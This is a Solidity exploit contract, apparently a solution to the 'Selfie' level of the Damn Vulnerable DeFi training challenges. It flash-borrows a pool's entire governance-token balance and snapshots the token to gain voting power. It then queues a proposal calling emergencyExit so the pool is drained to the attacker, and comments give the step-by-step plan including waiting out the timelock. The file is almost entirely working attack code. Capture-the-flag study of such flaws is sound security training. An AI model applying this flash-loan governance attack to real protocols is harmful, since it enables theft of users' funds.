// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "../DamnValuableTokenSnapshot.sol";
import "./SimpleGovernance.sol";
import "./SelfiePool.sol";
import "hardhat/console.sol";


contract AttackGovernance is IERC3156FlashBorrower {
    SelfiePool public pool;
    SimpleGovernance public governance;
    DamnValuableTokenSnapshot public governanceToken;
    address public attacker;

    constructor(address _pool, address _governance, address _token) {
        pool = SelfiePool(_pool);
        governance = SimpleGovernance(_governance);
        governanceToken = DamnValuableTokenSnapshot(_token);
    }

    /* 
        function flashLoan(
        IERC3156FlashBorrower _receiver,
        address _token,
        uint256 _amount,
        bytes calldata _data
    ) external nonReentrant returns (bool) {

    */
    function attack() public {
        attacker = msg.sender;
        bytes memory data = abi.encodeWithSignature("emergencyExit(address)", attacker);
        uint poolTokenBalance = governanceToken.balanceOf(address(pool));
        pool.flashLoan(IERC3156FlashBorrower(address(this)), address(governanceToken), poolTokenBalance, data);
    }

    // this callback gets invoked when you take out a flashloan
    function onFlashLoan(address userAddress, address _governanceTokenAddress, uint256 amount, uint256 zeroValue, bytes calldata data) public returns(bytes32) {
        // queueAction(address target, uint128 value, bytes calldata data)
        governanceToken.snapshot();
        governance.queueAction(address(pool), 0, data);
        governanceToken.approve(address(pool), amount); // instead of transfering back, you just approve an allowance and the pool will automatically do it
        return keccak256("ERC3156FlashBorrower.onFlashLoan");

        // then in another seperate transaction after the timelock period has passed, execute the proposal
    }
}

/*
    - goal is to drain all 1.5 millions tokens from the lending pool

    - take out flash loan to bypass `_hasEnoughVotes()`
    - take a snapshot while you have the flash loan so the governance contract thinks you have enough tokens to queue a proposal
    - call `queueAction()` to pass in a proposal that will call emergencyExit() on the lending pool contract to drain all it’s funds
    - pay back the flash loan to the lending pool
    - there is a timelock of 2 days
    - so wait 2 days and then call `executeAction()` to execute the malicious proposal that you previously queued up
*/